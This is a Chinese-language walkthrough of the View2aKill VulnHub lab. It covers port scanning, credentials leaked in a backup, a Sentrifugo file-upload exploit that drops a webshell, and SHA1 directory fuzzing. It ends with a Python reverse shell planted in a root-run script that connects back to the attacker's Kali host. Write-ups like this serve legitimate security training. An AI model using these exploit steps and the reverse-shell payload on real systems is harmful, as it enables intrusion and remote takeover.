---
layout: post
title: "View2aKill walkthrough"
date: 2021-10-10
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP                |
| ------------- | ----------------- |
| 本机（Win10） | `192.168.174.1`   |
| Kali          | `192.168.174.128` |
| View2aKill    | `192.168.174.140` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.140`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.140
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 22:53 EDT
Nmap scan report for 192.168.174.140
Host is up (0.0019s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 54:8e:3a:14:b2:be:03:5c:d4:08:3a:ed:bb:e1:55:53 (RSA)
|   256 aa:be:cb:e1:b6:7f:47:75:29:f7:63:e5:f9:39:78:2e (ECDSA)
|_  256 de:1c:31:e0:15:4d:f5:dc:8e:bc:3c:e4:7d:64:75:54 (ED25519)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: rain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=rain
| Subject Alternative Name: DNS:rain
| Not valid before: 2019-07-22T22:11:20
|_Not valid after:  2029-07-19T22:11:20
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 4 disallowed entries
|_/joomla /zorin /dev /defense
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: A View To A Kill
8191/tcp open  http    PHP cli server 5.5 or later
|_http-title: electronic controller app
```

扫描结果显示 **80** 端口所在的网页下存在 *robots.txt* 文件，并且在访问 `/dev` 路径时发现存在信息泄露，即在 *e_bkup.tar.gz* 备份文件中发现账户名：`chuck@localhost` 和密码构成规则：

```
Greeting Chuck, We welcome you to the team! Please login to our HR mgmt portal(which we spoke of) and fill out your profile and Details. Make sure to enter in the descrption of your CISSP under Training & Certificate Details since you mentioned you have it. I will be checking that section often as I need to fill out related paperwork. Login username: chuck@localhost.com and password is the lowercase word/txt from the cool R&D video I showed you with the remote detonator + the transmit frequency of an HID proxcard reader - so password format example: facility007. Sorry for the rigmarole, the Security folks will kill me if I send passwords in clear text. We make some really neat tech here at Zorin, glad you joined the team Chuck Lee! 
```

根据提示找到密码的第一个部分：`helicopter`

![1]({{ '/view2akill/1.bmp' | prepend: site.url }})

在 *HID6005.pdf* 文档中找到密码的第二个部分：`125`

![2]({{ '/view2akill/2.png' | prepend: site.url }})

至此我们找到了账户名和密码：`chuck@localhost.com:helicopter125`，并在[登录页面](http://192.168.174.140/sentrifugo/)进行登录，发现使用的是 *Sentrifugo* HR系统。

### Getshell

搜索发现该系统存在文件上传漏洞，执行利用脚本即可上传 webshell。

```shell
┌──(root💀kali)-[~]
└─# python3 48955.py -t http://192.168.174.140/sentrifugo -u "chuck@localhost.com" -p helicopter125                             1 ⨯
[~] Logging in
[+] Logged in
[~] Exploiting
[!] Spawning shell
www-data@view$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

简单信息收集发现靶机中存在四个普通账户：`jenny`、`max`、`mayday`和`scarpine`。之后在 */home/jenny* 主目录下发现备份文件。

```shell
www-data@view:/home/jenny$ ls -al
ls -al
total 24
drwxrwxrwx 2 jenny jenny 4096 Oct 27  2019 .
drwxr-xr-x 6 root  root  4096 Oct 27  2019 ..
-rw-r--r-- 1 jenny jenny  220 Oct 20  2019 .bash_logout
-rw-r--r-- 1 jenny jenny 3771 Oct 20  2019 .bashrc
-rw-r--r-- 1 jenny jenny  807 Oct 20  2019 .profile
-rw-r--r-- 1 jenny jenny  845 Oct 25  2019 dsktp_backup.zip
www-data@view:/tmp$ cat passswords.txt
cat passswords.txt
hr mgmt - NO ACCESS ANYMORE
jenny@localhost.com
ThisisAreallYLONGPAssw0rdWHY!!!!

ssh
jenny
!!!sfbay!!!
```

解压后发现 *jenny* 账户的密码：`!!!sfbay!!!`，切换到该账户后可查看 */home/max/aView.py* 脚本文件。

```shell
jenny@view:/home/max$ ls -al
total 28
drwxr-xr-x 2 max      jenny    4096 Oct 26  2019 .
drwxr-xr-x 6 root     root     4096 Oct 27  2019 ..
-rwxrwx--- 1 max      jenny     124 Oct 26  2019 aView.py
-rw-r--r-- 1 max      max       220 Oct 20  2019 .bash_logout
-rw-r--r-- 1 max      max      3771 Oct 20  2019 .bashrc
-rw-r--r-- 1 scarpine scarpine  553 Oct 26  2019 note.txt
-rw-r--r-- 1 max      max       807 Oct 20  2019 .profile
```

并且在 *note.txt* 文件中发现运行在 **8191** 端口的程序，提示我们需要对路径进行爆破。

```shell
jenny@view:/home/max$ cat note.txt
Max,

The electronic controller web application you asked for is almost done. Located on port 8191 this app will allow you to execute your plan from a remote location.

The remote trigger is located in a hidden web directory that only you should know - I verbally confirmed it with you. If you do not recall, the directory is based on an algorithm:  SHA1(lowercase alpha(a-z) + "view" + digit(0-9) + digit(0-9)).

Example: SHA1(rview86) = 044c64c6964998ccb62e8facda730e8307f28de6 = http://<ip>:8191/044c64c6964998ccb62e8facda730e8307f28de6/

- Scarpine
```

此外也注意到该进程是由 *root* 创建的。

```shell
root      1228  0.0  0.1  11592  1864 ?        Ss   03:21   0:00 /bin/bash /root/ctf-scripts/svc.sh
root      1238  0.0  1.9 273112 20152 ?        S    03:21   0:00  \_ php -S 0.0.0.0:8191
```

### 字典生成

使用 *python* 生成字典：

```python
import string
from hashlib import sha1

fuzz = []
for alpha in string.ascii_lowercase:
    for a in string.digits:
        for b in string.digits:
            payload = sha1((alpha+"view"+a+b+"\n").encode("utf-8")).hexdigest()
            fuzz.append(payload)

newfile = open("dic.txt","w")

for i in fuzz:
    newfile.write(i)
    newfile.write("\n")

newfile.close()
```

下一步使用 *fuzz* 工具进行枚举，经过一番过滤，最终找到有效的路径：`http://192.168.174.140:8191/7f98ca7ba1484c66bf09627f931448053ae6b55a`

```shell
┌──(root💀kali)-[~]
└─# ffuf -u http://192.168.174.140:8191/FUZZ -w dic.txt -fs 167,119,147

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.174.140:8191/FUZZ
 :: Wordlist         : FUZZ: dic.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 167,119,147
________________________________________________

7f98ca7ba1484c66bf09627f931448053ae6b55a [Status: 200, Size: 815, Words: 79, Lines: 46]
d0fa319a11ef644862edf51b9177b9d62a1e6650 [Status: 200, Size: 133, Words: 6, Lines: 5]
ef1cacc0f3b5aea1a0d56c5df4263580e7b23570 [Status: 200, Size: 133, Words: 6, Lines: 5]
e7642454c8c6047fd883a859580a0723657fcf45 [Status: 200, Size: 115, Words: 4, Lines: 6]
2cfc36dfe3e7f20faa2ad9bc2091c25387844adf [Status: 200, Size: 133, Words: 6, Lines: 5]
```

![3]({{ '/view2akill/3.png' | prepend: site.url }})

点击执行将会执行 *aView.py* 脚本，因此在脚本中 socket连接代码，一旦运行即可得到 *root* 权限的 *shell* ：

```python
jenny@view:/home/max$ cat aView.py
#!/usr/bin/python
#
# executed from php app add final wrapper/scirpt here

import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.174.128",6677))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
```

### 提权

Kali 监听 **6677** 端口，运行 */root/run_me_for_flag.sh* 脚本即可得到 flag：

```shell
┌──(root💀kali)-[~]
└─# nc -lvp 6677
listening on [any] 6677 ...
192.168.174.140: inverse host lookup failed: Unknown host
connect to [192.168.174.128] from (UNKNOWN) [192.168.174.140] 43348
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/root/destroy/7f98ca7ba1484c66bf09627f931448053ae6b55a
# cd /root
# ls
ctf-scripts
Desktop
destroy
flag
# cd flag
# ls
files
index.php
run_me_for_flag.sh
# ./run_me_for_flag.sh
-------------------------------
-------------------------------
Go here:   http://<ip>:8007
-------------------------------
-------------------------------
```

![4]({{ '/view2akill/4.png' | prepend: site.url }})

### 总结

1. 使用 *mp64* 生成字典：`mp64 ?lview?d?d > dic.txt`

